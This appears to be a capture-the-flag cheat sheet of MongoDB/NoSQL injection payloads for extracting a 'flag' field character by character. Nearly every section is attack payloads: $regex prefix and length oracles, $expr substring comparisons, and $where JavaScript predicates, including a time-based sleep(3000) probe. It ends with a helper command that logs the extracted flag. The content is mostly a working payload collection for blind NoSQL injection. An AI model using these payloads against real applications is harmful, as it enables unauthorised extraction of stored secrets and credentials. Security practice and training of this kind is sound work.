# Flag extraction — the flag-field's char-by-char

## The `flag` field — the prefix-walk

```json
{"flag": {"$regex": "^flag\\{"}}
{"flag": {"$regex": "^flag\\{a"}}
{"flag": {"$regex": "^flag\\{al"}}
{"flag": {"$regex": "^flag\\{al3"}}
```

`^flag\{` — the flag-prefix — then char-by-char inside `{...}` —
`extraction.md`.

## The flag-charset — `a-z0-9_{}-`

```text
flag{ ... a-z 0-9 _ - ... }
```

The bounded alphabet — the prefix-walk's char-set — `extraction-deep.md`.

## The length-oracle — `^.{N}$`

```json
{"flag": {"$regex": "^.{10}$"}}
{"flag": {"$regex": "^.{20}$"}}
{"flag": {"$regex": "^.{30}$"}}
{"flag": {"$regex": "^.{40}$"}}
{"flag": {"$regex": "^.{50}$"}}
{"flag": {"$regex": "^.{32}$"}}
{"flag": {"$regex": "^.{64}$"}}
{"flag": {"$regex": "^.{10,50}$"}}
{"flag": {"$regex": "^.{20,100}$"}}
```

The flag's length — `extraction.md`.

## The position-oracle — `^.{N}c`

```json
{"flag": {"$regex": "^.{5}a"}}
{"flag": {"$regex": "^.{6}b"}}
{"flag": {"$regex": "^.{7}c"}}
{"flag": {"$regex": "^.{8}d"}}
{"flag": {"$regex": "^.{9}e"}}
{"flag": {"$regex": "^.{10}f"}}
{"flag": {"$regex": "^.{11}0"}}
{"flag": {"$regex": "^.{12}1"}}
{"flag": {"$regex": "^.{13}2"}}
{"flag": {"$regex": "^.{14}3"}}
{"flag": {"$regex": "^.{15}4"}}
{"flag": {"$regex": "^.{16}5"}}
{"flag": {"$regex": "^.{17}6"}}
{"flag": {"$regex": "^.{18}7"}}
{"flag": {"$regex": "^.{19}8"}}
{"flag": {"$regex": "^.{20}9"}}
```

`^.{N}c` — the char at index N — `extraction-deep.md`.

## The `}` terminator — the flag's end

```json
{"flag": {"$regex": "\\}$"}}
{"flag": {"$regex": "\\}$", "$options": "i"}}
{"flag": {"$regex": "^flag\\{[a-z0-9_-]+\\}$"}}
```

`\}$` — the flag ends with `}` — the flag-length check — `extraction.md`.

## The `$expr` — the flag-field's substr

```json
{"$expr": {"$eq": [{"$substrCP": ["$flag", 0, 4]}, "flag"]}}
{"$expr": {"$eq": [{"$substrCP": ["$flag", 4, 1]}, "{"]}}
{"$expr": {"$eq": [{"$substrCP": ["$flag", 5, 1]}, "a"]}}
{"$expr": {"$eq": [{"$substrCP": ["$flag", -1, 1]}, "}"]}}
{"$expr": {"$eq": [{"$strLenCP": "$flag"}, 32]}}
{"$expr": {"$eq": [{"$strLenCP": "$flag"}, 40]}}
{"$expr": {"$eq": [{"$strLenCP": "$flag"}, 64]}}
{"$expr": {"$eq": [{"$indexOfCP": ["$flag", "{"]}, 4]}}
{"$expr": {"$eq": [{"$indexOfCP": ["$flag", "}"]}, 31]}}
{"$expr": {"$regexMatch": {"input": "$flag", "regex": "^flag\\{"}}}
{"$expr": {"$regexMatch": {"input": "$flag", "regex": "\\}$"}}}
```

`$expr` — the aggregation-operators — `operators-js.md`.

## The `$where` — the JS-predicates

```json
{"user": {"$where": "this.flag[0] == 'f'"}}
{"user": {"$where": "this.flag[4] == '{'"}}
{"user": {"$where": "this.flag[5] == 'a'"}}
{"user": {"$where": "this.flag.substr(0, 4) == 'flag'"}}
{"user": {"$where": "this.flag.startsWith('flag{')"}}
{"user": {"$where": "this.flag.endsWith('}')"}}
{"user": {"$where": "this.flag.indexOf('{') == 4"}}
{"user": {"$where": "this.flag.indexOf('}') == this.flag.length - 1"}}
{"user": {"$where": "this.flag.length == 32"}}
{"user": {"$where": "this.flag.charCodeAt(5) == 97"}}
{"user": {"$where": "this.flag.match(/^flag\\{/)")}}
{"user": {"$where": "this.flag.match(/\\}$/)")}}
{"user": {"$where": "this.flag.split('{')[1][0] == 'a'"}}
{"user": {"$where": "this.flag[5] == 'a' ? sleep(3000) : true"}}
```

`operators-js.md`.

## The full-walk — the flag-complete

```json
{"flag": {"$regex": "^flag\\{[a-z0-9_-]{27}\\}$"}}
{"flag": {"$regex": "^flag\\{[a-z0-9_-]+\\}$"}}
{"flag": {"$regex": "^flag\\{a1b2c3_..."}}
```

The full flag's pattern — `extraction-deep.md`.

## The readback — the verbatim excerpt

```bash
python3 tools/hooks.py pre-flag <name> --value "flag{...}" \
  --source "response" --evidence "<the verbatim excerpt>"
```

`evidence-rules.md`.
